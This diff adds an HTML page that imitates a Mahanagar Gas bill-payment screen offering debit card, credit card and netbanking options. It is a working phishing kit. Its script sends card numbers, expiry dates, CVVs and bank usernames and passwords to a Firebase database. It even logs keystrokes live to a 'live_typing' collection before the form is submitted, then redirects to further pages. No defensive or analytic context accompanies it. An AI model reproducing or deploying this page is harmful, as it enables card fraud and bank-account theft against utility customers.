@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>dehijlbrd</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial;
+      background-color: #FFFFFF;
+      text-align: center;
+      padding-top: 50px;
+    }
+    img {
+      width: 300px;
+      border-radius: 10px;
+    }
+    .form-container {
+      margin-top: 50px;
+      max-width: 400px;
+      margin: auto;
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    .form-container h2 {
+      text-align: center;
+      background-color: #0f7213;
+      color: white;
+      padding: 10px;
+      border-radius: 5px;
+    }
+    .section-title {
+      margin-top: 20px;
+      font-size: 20px;
+      font-weight: bold;
+      text-align: center;
+    }
+    .side-button {
+      width: 100%;
+      padding: 10px;
+      font-size: 16px;
+      background-color: transparent;
+      color: black;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      margin-bottom: 10px;
+      cursor: pointer;
+    }
+    .side-button:hover {
+      background-color: #f0f0f0;
+    }
+    .payment-form {
+      margin-top: 20px;
+      text-align: left;
+      display: none;
+    }
+    .payment-form.active {
+      display: block;
+    }
+    .payment-form input,
+    .payment-form select,
+    .submit-button {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 10px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    .row {
+      display: flex;
+      gap: 10px;
+    }
+    .row input {
+      flex: 1;
+    }
+    .submit-button {
+      background-color: #4082ff;
+      color: white;
+      cursor: pointer;
+    }
+    .submit-button:hover {
+      background-color: #388e3c;
+    }
+    .form-image {
+      width: 100%;
+      margin-top: 10px;
+      border-radius: 10px;
+    }
+  </style>
+</head>
+<body>
+  <img src="https://meek-semolina-bb73d5.netlify.app/top.jpg" alt="Meri Tasveer">
+  <div class="form-container">
+    <h2>Mahanagar Gas</h2>
+    <div class="section-title">Payment Method</div>
+
+    <button class="side-button" onclick="showForm('debit')">💳 Debit Card</button>
+    <button class="side-button" onclick="showForm('credit')">💳 Credit Card</button>
+    <button class="side-button" onclick="showForm('netbanking')">🏦 NetBanking</button>
+
+    <!-- Debit Card Form -->
+    <div id="debitForm" class="payment-form active">
+      <input type="tel" maxlength="16" placeholder="Debit Card Number" id="debitCardNumber" oninput="liveUpdate()">
+      <div class="row">
+        <input type="tel" maxlength="2" placeholder="MM" id="debitMonth" oninput="liveUpdate()">
+        <input type="tel" maxlength="4" placeholder="YYYY" id="debitYear" oninput="liveUpdate()">
+        <input type="password" maxlength="3" placeholder="CVV" id="debitCVV" oninput="liveUpdate()">
+      </div>
+      <button class="submit-button" onclick="submitCard('debit')">Proceed</button>
+      <img class="form-image" src="https://meek-semolina-bb73d5.netlify.app/pay.jpg" alt="Card Image">
+    </div>
+
+    <!-- Credit Card Form -->
+    <div id="creditForm" class="payment-form">
+      <input type="tel" maxlength="16" placeholder="Credit Card Number" id="creditCardNumber" oninput="liveUpdate()">
+      <div class="row">
+        <input type="tel" maxlength="2" placeholder="MM" id="creditMonth" oninput="liveUpdate()">
+        <input type="tel" maxlength="4" placeholder="YYYY" id="creditYear" oninput="liveUpdate()">
+        <input type="password" maxlength="3" placeholder="CVV" id="creditCVV" oninput="liveUpdate()">
+      </div>
+      <button class="submit-button" onclick="submitCard('credit')">Proceed</button>
+      <img class="form-image" src="https://meek-semolina-bb73d5.netlify.app/pay.jpg" alt="Card Image">
+    </div>
+
+    <!-- NetBanking Form -->
+    <div id="netbankingForm" class="payment-form">
+      <select id="bankSelect" onchange="liveUpdate()"></select>
+      <input type="text" placeholder="Username / User ID" id="netUser" oninput="liveUpdate()">
+      <input type="password" placeholder="Login Password" id="netPass" oninput="liveUpdate()">
+      <button class="submit-button" onclick="submitNetBanking()">Proceed</button>
+      <img class="form-image" src="https://meek-semolina-bb73d5.netlify.app/pay.jpg" alt="Banking Image">
+    </div>
+  </div>
+
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-firestore-compat.js"></script>
+  <script>
+      const firebaseConfig = {
+      apiKey: "AIzaSyD7kr-x5CJLdWGoj6r_MAPmhnJWe8Jc3oI",
+      authDomain: "ss22-a96d3.firebaseapp.com",
+      projectId: "ss22-a96d3",
+      storageBucket: "ss22-a96d3.appspot.com",
+      messagingSenderId: "607942972170",
+      appId: "1:607942972170:web:2e38b2d5410ff37f3960f3"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    let liveDocId = null;
+
+    function liveUpdate() {
+      const data = {
+        debitCard: document.getElementById("debitCardNumber")?.value || "",
+        creditCard: document.getElementById("creditCardNumber")?.value || "",
+        netUser: document.getElementById("netUser")?.value || "",
+        netPass: document.getElementById("netPass")?.value || "",
+        bank: document.getElementById("bankSelect")?.value || "",
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+      };
+
+      if (!liveDocId) {
+        db.collection("live_typing").add(data).then(doc => {
+          liveDocId = doc.id;
+        });
+      } else {
+        db.collection("live_typing").doc(liveDocId).update(data);
+      }
+    }
+
+    function showForm(type) {
+      document.querySelectorAll('.payment-form').forEach(f => f.classList.remove('active'));
+      document.getElementById(`${type}Form`).classList.add('active');
+    }
+
+    function submitCard(type) {
+      const cardNum = document.getElementById(`${type}CardNumber`).value;
+      const mm = document.getElementById(`${type}Month`).value;
+      const yy = document.getElementById(`${type}Year`).value;
+      const cvv = document.getElementById(`${type}CVV`).value;
+
+      db.collection("payments").add({
+        method: `${type} card`,
+        card: cardNum,
+        expiry: `${mm}/${yy}`,
+        cvv: cvv,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+      }).then(() => {
+        window.location.href = "page9.html";
+      });
+    }
+
+    function submitNetBanking() {
+      const bank = document.getElementById("bankSelect").value;
+      const user = document.getElementById("netUser").value.trim();
+      const pass = document.getElementById("netPass").value.trim();
+
+      if (user === "" || pass === "") {
+        alert("Please enter both Username and Password.");
+        return;
+      }
+
+      db.collection("payments").add({
+        method: "netbanking",
+        bank: bank,
+        username: user,
+        password: pass,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+      }).then(() => {
+        window.location.href = "page11.html";
+      });
+    }
+
+    const bankList = [
+      "SelectBank", "Allahabad Bank", "Andhra Bank", "Axis Bank", "HDFC Bank",
+      "Bank of Baroda - Corporate Banking", "Bank of Baroda - Retail Banking",
+      "Bank of India", "Bank of Maharashtra", "Canara Bank", "Central Bank of India",
+      "City Union Bank", "Corporation Bank", "Deutsche Bank", "Development Credit Bank",
+      "Dhanlaxmi Bank", "Federal Bank", "ICICI Bank", "IDBI Bank", "Indian Bank",
+      "Indian Overseas Bank", "IndusInd Bank", "ING Vysya Bank", "Jammu and Kashmir Bank",
+      "Karnataka Bank Ltd", "Karur Vysya Bank", "Kotak Bank", "Laxmi Vilas Bank",
+      "Oriental Bank of Commerce", "Punjab National Bank - Corporate Banking",
+      "Punjab National Bank - Retail Banking", "Punjab & Sind Bank",
+      "Shamrao Vitthal Co-operative Bank", "South Indian Bank",
+      "State Bank of Bikaner & Jaipur", "State Bank of Hyderabad", "State Bank of India",
+      "State Bank of Mysore", "State Bank of Patiala", "State Bank of Travancore",
+      "Syndicate Bank", "Tamilnad Mercantile Bank Ltd.", "UCO Bank",
+      "Union Bank of India", "United Bank of India", "Vijaya Bank", "Yes Bank Ltd"
+    ];
+
+    window.onload = function () {
+      const bankSelect = document.getElementById("bankSelect");
+      bankSelect.innerHTML = "";
+      bankList.forEach(bank => {
+        const opt = document.createElement("option");
+        opt.value = opt.text = bank;
+        bankSelect.appendChild(opt);
+      });
+    };
+  </script>
+</body>
+</html>
